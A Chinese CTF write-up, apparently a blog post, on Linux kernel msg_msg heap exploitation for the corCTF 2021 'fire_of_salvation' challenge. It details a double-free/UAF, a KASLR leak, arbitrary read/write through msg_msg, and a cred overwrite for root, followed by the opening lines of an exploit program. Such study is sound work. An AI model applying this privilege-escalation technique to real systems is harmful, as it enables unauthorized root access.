class="line"><span class="comment">		 * - Set pointer to message</span></span><br><span class="line"><span class="comment">		 * - Queue the receiver task for later wakeup</span></span><br><span class="line"><span class="comment">		 * - Wake up the process after the lock is dropped.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * Should the process wake up before this wakeup (due to a</span></span><br><span class="line"><span class="comment">		 * signal) it will either see the message and continue ...</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg);</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN)) &#123;</span><br><span class="line">			<span class="comment">/* see MSG_BARRIER for purpose/pairing */</span></span><br><span class="line">			smp_acquire__after_ctrl_dep();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 <span class="comment">/*</span></span><br><span class="line"><span class="comment">		  * ... or see -EAGAIN, acquire the lock to check the message</span></span><br><span class="line"><span class="comment">		  * again.</span></span><br><span class="line"><span class="comment">		  */</span></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg);</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		list_del(&amp;msr_d.r_list);</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			msg = ERR_PTR(-ERESTARTNOHAND);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">	free_msg(msg);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="msg利用"><a href="#msg利用" class="headerlink" title="msg利用"></a>msg利用</h2><p>只要能控制了msg_msg后确实可以达到任意地址写和任意地址读，而且堆块范围是<code>0x40~0x1000</code>,感觉非常好用。</p>
<p>本文通过<code>corCTF 2021</code>两道内核题学习对msg_msg的利用。应该会很有难度，预计复现至少两天。(看完整个解题思路和长达400多行以及700多行的exp,🤦‍♀️坏了，不只是需要两天了。至少一周或者更久。。。</p>
<h3 id="fire-of-salvation"><a href="#fire-of-salvation" class="headerlink" title="fire_of_salvation"></a>fire_of_salvation</h3><p>题目给了源代码十分好审计，主要结构体如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> EASY_MODE</span></span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">user_rule_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> EASY_MODE</span></span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">rule_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>漏洞出现在了dup()函数下，在全局指针数组中可以存储两次指向同一个堆块的指针，这导致可以释放两次同一个堆块，既可以doublefree又可以uaf.</p>
<h4 id="填坑"><a href="#填坑" class="headerlink" title="填坑"></a>填坑</h4><p>令人感叹，距离写下上一段话到现在已经过了半个月了，确实懒狗了这下，本来想着学完mit6.s081后再继续学习二进制的，但是肝了一周了有点肝不动了，前面还好说，后面的课确实沾点难度了，一个半小时的课我得看三个小时才能啃下来，想起了<code>msg</code>还没学完，那就换个东西折磨我吧。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>由于开启了kaslr和fg_kaslr,所以肯定得先获取内核地址，但是注意由于开启了<code>fg_kaslr</code>之后就没有那么简单了，<code>fg_kaslr</code>会在<code>kaslr</code>上以函数粒度对地址再进一步打乱，这个打乱也是随机的，所以函数到内核基地址的偏移是随时发现变化的，但是<code>fg_kaslr</code>有些区域不会被打乱</p>
<blockquote>
<p>1..text段</p>
<p>2.data段</p>
<p>3.__ksymtab</p>
</blockquote>
<p>知道了上面区域的一些地址就可以知道内核的基地址了。在这道题中选择使用<code>shm_file_data</code>结构体来泄露内核data段地址进而知道内核基地址。其中<code>ipc_namespace</code>就指向内核data段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>泄露地址可以分为一下几步</p>
<ul>
<li>1.首先构造一个4kb的uaf然后申请一个<code>0xfd8</code>大小的<code>msg_msg</code>，此时<code>msg</code>结构体如下图</li>
</ul>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221017001913589.png" alt="image-20221017001913589"></p>
<ul>
<li>2.堆喷，这样<code>shm_file_data</code>就可能落到<code>struct msg_msg</code>下面了</li>
<li>3.利用<code>uaf</code>修改<code>m_ts</code>，这个变量记录了这个消息的大小，改大之后再<code>MSG_COPY</code>这个消息队列就可以可以得到<code>struct msg_msg</code>后面的堆的信息了，也就得到了内核基地址。</li>
<li>4.利用基地址就可以算出<code>init_cred</code>和<code>init_task</code>了，这两个结构体都在内核data段中，可以直接算出。</li>
</ul>
<p>得到上面的地址就可以利用<code>init_task</code>来找到这个进程的<code>task_struct</code>了。</p>
<p>每个进程都有一个<code>task_struct</code>，内核使用双向循环表来组织这个结构体，字段为<code>struct list_head        tasks;</code></p>
<p>结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>所以可以通过<code>init_task</code>的<code>prev</code>向上寻找，直到找到这个进程的<code>task_struct</code>。</p>
<p>说白了就是通过修改<code>msg</code>的<code>next</code>字段完成任意读操作，关键是如何构造<code>msg</code>了，下面是作者给出的构造示意图，我也是按照这个进行构造的，我们得覆盖<code>next</code>让其指向<code>task_struct</code>的某一个地方，然后再读这个<code>task_struct</code>，但是对<code>next</code>的覆盖是有要求的，他所指向的地址的前八个字节必须为空，不然读取和写入的时候就会报错，具体原因看看源码就懂了。</p>
<p>其中<code>struct list_head        tasks</code>在位于<code>task_struct</code>的0x298偏移出，其前八个字节刚好是<code>null</code>,所以可以让<code>next</code>指向<code>task_struct_addr+0x290</code>处。这样就可以读到<code>task_struct</code>的<code>prev</code>和<code>pid</code>了，pid位于<code>task_struct</code>的0x398处，然后整一个循环读到当前进程的<code>task_struct</code>了。</p>
<p><img src="https://1.bp.blogspot.com/-Y-YqvmgaX1U/YSggQhwb5pI/AAAAAAAACIc/leKw-FMmY_8TuX-rqv_H0Get2kT3NFEEACLcBGAsYHQ/w640-h426/3.png" alt="img"></p>
<p>注意<code>prev</code>并不指向上一个进程的<code>task_struct</code>的开头，而是指向其中的字段<code>struct list_head tasks</code>，所以减去0x298就得到当前<code>task_struct</code>的基地址了。</p>
<p>得到当前进程<code>task_struct</code>的基地址后就得构造任意地址写来完成对当前进程<code>task_struct</code>中的<code>real_cred 和 cred</code>指针的覆写，覆写成<code>init_cred</code>指针。</p>
<p>首先考虑<code>msg</code>的<code>next</code>应该指向哪里，<code>read_cred</code>和<code>cred</code>对于<code>task_struct</code>的偏移是0x538和0x540。<code>real_cred</code>的前八个字节刚好还是<code>null</code>,所以可以让<code>next</code>指向<code>task_struct+0x538-0x8</code>.</p>
<p><img src="https://1.bp.blogspot.com/-MhE76o_slr0/YSfwYpL-e-I/AAAAAAAACIQ/-ThXZ-1XlH4-hQJzKbxsJazF73c8g_SWQCLcBGAsYHQ/w640-h402/4.png" alt="img"></p>
<p>只要考虑清楚<code>next</code>的的取值问题，任意地址写就是套<code>userfaulted</code>的板子了,步骤如下</p>
<ul>
<li>先mmap一段ox2000的内存，然后在0x1000-0x8处填上mtype,把0x1000注册缺页处理，然后<code>send_msg(msg_id, msg_buff, size - 0x30, 0);</code></li>
<li>当msg进入缺页处理函数的时候，准备好<code>page</code>,其<code>0xfd0</code>和<code>0xfd8</code>处准备好<code>init_cred</code>，然后利用设备的edit修改<code>msg</code>的next指针</li>
</ul>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_API 0xc018aa3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER 0xc020aa00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_UNREGISTER 0x8010aa01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY 0xc028aa03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_ZEROPAGE 0xc020aa04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_WAKE 0x8010aa02</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC_MAX 0x800</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> target_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line">err_exit(<span class="keyword">char</span> *buf)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span> <span class="comment">//ioctl wrapper</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ioctl\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_ioctl, fd, request, param);</span><br><span 